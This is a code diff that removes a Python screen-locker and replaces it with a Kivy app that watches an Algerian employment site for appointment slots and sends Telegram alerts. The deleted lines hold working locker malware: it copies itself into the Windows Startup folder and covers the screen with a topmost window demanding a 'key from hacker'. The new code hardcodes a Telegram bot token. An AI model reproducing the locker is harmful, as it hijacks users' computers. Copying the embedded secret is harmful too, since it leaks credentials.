@@ -1,61 +1,57 @@
-import tkinter as tk
-from tkinter import messagebox
-import os
-import sys
-import shutil
+from kivy.app import App
+from kivy.uix.boxlayout import BoxLayout
+from kivy.uix.label import Label
+from kivy.uix.button import Button
 import threading
+import time
+import requests
+from bs4 import BeautifulSoup
 
+TOKEN = "8304126927:AAGKnXke0AY-T-YVxMJJonCs1q26nCbrRPo"
+CHAT_ID = "8309958339"
+URL_SITE = "https://minha.anem.dz/pre_inscription"
 
-# تحديد مسار التطبيق
-path_app = os.path.abspath(sys.argv[0])
+running = False
 
-# تحديد مجلد البداية في قائمة "ابدأ"
-run_start = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-name = os.path.join(run_start, "oday.exe")
+def send_telegram_message(message):
+    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+    data = {"chat_id": CHAT_ID, "text": message}
+    requests.post(url, data=data)
 
-# إذا لم يكن التطبيق موجودًا في المجلد، قم بنسخه
-if not os.path.exists(name):
-    shutil.copy(path_app, name)
+def check_loop():
+    global running
+    while running:
+        try:
+            r = requests.get(URL_SITE, timeout=10)
+            soup = BeautifulSoup(r.text, "html.parser")
+            if "لا توجد مواعيد" not in soup.text:
+                send_telegram_message("✅ يوجد موعد متاح الآن!")
+            time.sleep(30)
+        except:
+            time.sleep(30)
 
-# دالة للخروج من التطبيق
-def exit_app():
-    root.destroy()
+class MainApp(App):
+    def build(self):
+        layout = BoxLayout(orientation="vertical")
+        self.status_label = Label(text="اضغط لبدء المراقبة")
+        start_btn = Button(text="بدء المراقبة", on_press=self.start_check)
+        stop_btn = Button(text="إيقاف المراقبة", on_press=self.stop_check)
+        layout.add_widget(self.status_label)
+        layout.add_widget(start_btn)
+        layout.add_widget(stop_btn)
+        return layout
 
-# دالة للتحقق من المفتاح المدخل
-def clos(event=None):
-    key = "1234567"
-    if entry.get() == key:
-        exit_app()
-    else:
-        messagebox.showerror("Don't play with me", "The key is wrong")
+    def start_check(self, instance):
+        global running
+        if not running:
+            running = True
+            threading.Thread(target=check_loop, daemon=True).start()
+            self.status_label.text = "📡 المراقبة بدأت..."
 
-# إعداد واجهة المستخدم
-root = tk.Tk()
+    def stop_check(self, instance):
+        global running
+        running = False
+        self.status_label.text = "⏹ تم إيقاف المراقبة"
 
-# إخفاء إطار النافذة
-root.overrideredirect(True)
-root.attributes("-topmost", True)
-
-# إضافة النصوص والعناصر
-tk.Label(root, text="Enter the key from hacker:", bg="green", fg="black").pack()
-
-entry = tk.Entry(root, width=50, border=0)
-entry.pack(pady=20)
-
-b = tk.Button(root, text="Submit", command=clos)
-b.pack()
-
-root.config(background="green")
-root.resizable(False, False)
-
-# جعل نافذة التطبيق تغطي الشاشة بالكامل
-root.geometry(f"{root.winfo_screenwidth()}x{root.winfo_screenheight()}+0+0")
-root.title("Keno")
-
-tk.Label(root, text="hack@gmail.com", bg="green", fg="black").pack(pady=20)
-
-# استدعاء الدالة clos عند الضغط على Enter أو الزر Submit
-entry.bind("<Return>", clos)
-
-# تشغيل نافذة tkinter
-root.mainloop()
+if __name__ == "__main__":
+    MainApp().run()
